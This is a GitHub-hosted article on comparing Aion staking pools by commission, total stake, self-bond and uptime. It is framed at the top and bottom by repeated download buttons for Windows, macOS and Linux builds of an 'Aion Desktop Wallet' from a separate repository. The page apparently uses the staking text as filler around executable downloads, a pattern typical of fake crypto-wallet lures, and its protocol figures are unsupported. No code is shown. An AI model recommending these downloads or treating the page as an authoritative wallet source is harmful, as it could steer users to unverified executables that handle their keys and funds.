![Aion Wallet](assets/banner-article.png)

# Aion staking pool choice: what to compare

A non-custodial AION wallet for Windows, macOS, Linux, with keys on your own machine.

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

> **Only download from this GitHub release page.**

Choosing an Aion staking pool comes down to four things you can check before delegating and one you can only observe afterwards: commission, total stake, registration and bond, the operator's record, and how steadily the pool actually produces blocks.

Commission is the only one shown as a single number, which is why it attracts more attention than it deserves. A pool that charges nothing but produces rarely pays less than one that charges a normal rate and produces consistently.

## You'll see this if

- You are about to delegate and the pool list is a wall of similar names.
- You delegated to the cheapest pool and the returns do not match the advertised rate.
- You are deciding whether to move an existing position.
- You want to know what a commission change would mean for you.

## Commission, and what it does not tell you

Commission is the share of your rewards the operator keeps. It is set by the operator and can only change within a lockout of 60,480 blocks, roughly seven days, which limits how quickly a favourable rate can turn into an unfavourable one.

A low commission is a good sign only when the pool is also producing. Operators subsidise a low rate to attract stake, and an under-staked pool with a low rate produces blocks rarely, so the effective return can be worse than a pool charging more.

## Total stake and production

Block production follows weight, and weight follows the pool's total stake including delegation. A pool with a large total produces more often, which smooths a delegator's returns; a small pool produces rarely, so its returns arrive in lumps and look erratic over a short window.

Neither is wrong. A large pool is steadier; a small pool can pay a larger share of a smaller total if its production happens to fall your way. What is wrong is judging either from a single day.

## The bond and the registration

A pool has to register with a self-bond of at least 1,000 AION, and operators are expected to hold a meaningful stake of their own relative to what they hold for others.

That matters because it aligns the operator with the delegators. A pool run on a minimal deposit and a large delegated balance has less to lose from behaving carelessly.

The [Aion minimum stake](https://github.com/aion-wallet/aion-staking/blob/main/aion-minimum-stake.md) article explains the rule in full.

## What you can only observe

Uptime. A pool that has been registered and producing for a long time has a record; a pool registered last week does not, and its early numbers are noise rather than performance.

You can observe this from the staking view over a month, comparing what arrived with what was delegated. Anything shorter is a sample too small to judge.

## Moving between pools

Moving stake means undelegating first and waiting out the thaw, roughly one day, before delegating to the new pool. The [Aion undelegating time](https://github.com/aion-wallet/aion-staking/blob/main/aion-undelegating-time.md) guide covers the timing and the fee reserve the exit needs.

That cost, a day out of the market plus a small fee, is the reason to choose carefully rather than to switch on a rumour.

## A practical order of checks

1. Confirm the pool is registered and see its total stake.
2. Read the commission and when it last changed.
3. Look at how long it has been operating.
4. Delegate a small amount first if the pool is new to you.
5. Compare the first month's rewards with the published rate before committing more.

Whatever you choose, the exit is the same, and the [Aion undelegating time](https://github.com/aion-wallet/aion-staking/blob/main/aion-undelegating-time.md) guide is the one to read before committing rather than after.

## Prevention

Write down the pool, the date and the amount. A position without a record is impossible to audit later.

Do not chase a commission change. A pool raising its rate is a reason to evaluate, not necessarily to leave, and the lockout means the change is visible before it bites.

Keep a fee reserve. Undelegating needs AION available, and the reserve is what makes leaving possible.

## Reading a pool's numbers without being misled

A pool's total stake tells you how often it produces. Its commission tells you what share the operator keeps. Neither tells you what you will earn, because that also depends on production over the period and on the network's rewards.

A useful habit is to compute the pool's effective share: the fraction of total network weight it holds, multiplied by the reward, minus commission. That number is still a projection, but it is built from the pool's own figures rather than from an advertised percentage.

Treat a very low commission on a very small pool as a marketing decision, and read the [Aion staking rewards](https://github.com/aion-wallet/aion-staking/blob/main/aion-staking-rewards.md) article before moving stake on the strength of a rate.

## Frequently asked questions

### Is a zero-commission pool better?

Only if it produces reliably. Commission is one input; production and total stake decide what the commission applies to.

### How often can a pool change commission?

At most once per 60,480 blocks, roughly seven days, which is the lockout period.

### Can I split stake across two pools?

Yes. Each delegation is a separate position, and both appear in the staking view.

### What happens if a pool stops producing?

Your stake stays yours. You can undelegate after the thaw and move it, which is why the fee reserve matters.

## Download Aion Wallet

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

## Related articles

- [How to stake AION](https://github.com/aion-wallet/aion-staking/blob/main/how-to-stake-aion.md) - the delegation transaction.
- [Aion staking rewards](https://github.com/aion-wallet/aion-staking/blob/main/aion-staking-rewards.md) - what a position earns.
- [Aion undelegating time](https://github.com/aion-wallet/aion-staking/blob/main/aion-undelegating-time.md) - leaving a pool.
- [Aion solo staker node](https://github.com/aion-wallet/aion-staking/blob/main/aion-solo-staker-node.md) - the alternative to delegating.
